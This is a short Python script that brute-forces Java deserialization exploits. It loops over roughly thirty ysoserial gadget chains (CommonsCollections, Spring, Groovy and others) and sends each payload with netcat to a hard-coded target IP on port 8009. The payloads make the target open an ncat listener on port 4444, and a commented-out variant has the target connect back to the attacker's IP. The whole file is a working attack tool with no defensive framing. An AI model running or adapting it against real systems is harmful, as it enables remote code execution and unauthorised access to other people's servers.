#!/usr/bin/env python
import os

methods = ["BeanShell1",
    "C3P0",
    "Clojure",
    "CommonsBeanutils1",
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsCollections5",
    "CommonsCollections6",
    "FileUpload1",
    "Groovy1",
    "Hibernate1",
    "Hibernate2",
    "JBossInterceptors1",
    "JRMPClient",
    "JRMPListener",
    "JSON1",
    "JavassistWeld1",
    "Jdk7u21",
    "Jython1",
    "MozillaRhino1",
    "MozillaRhino2",
    "Myfaces1",
    "Myfaces2",
    "ROME",
    "Spring1",
    "Spring2",
    "URLDNS",
    "Wicket1"]


me = "10.102.19.154"
them = "10.102.25.238"

#orig = 'java -jar ysoserial.jar METHOD "/usr/bin/nc ME 4444" > con'.replace("ME", me) # get them to connect to me on 4444
orig = 'java -jar ysoserial.jar METHOD "/usr/bin/ncat -lvp 4444&" > con' # get them to open port 4444

check = "cat con | nc THEM 8009".replace("THEM", them) # send the bytecode

check2 = "nc THEM 8009".replace("THEM", them) # this is how to check - do this manually

for method in methods:
    cmd = orig.replace("METHOD", method)
    
    print(cmd)
    os.system(cmd)
    
    print(check)
    os.system(check)

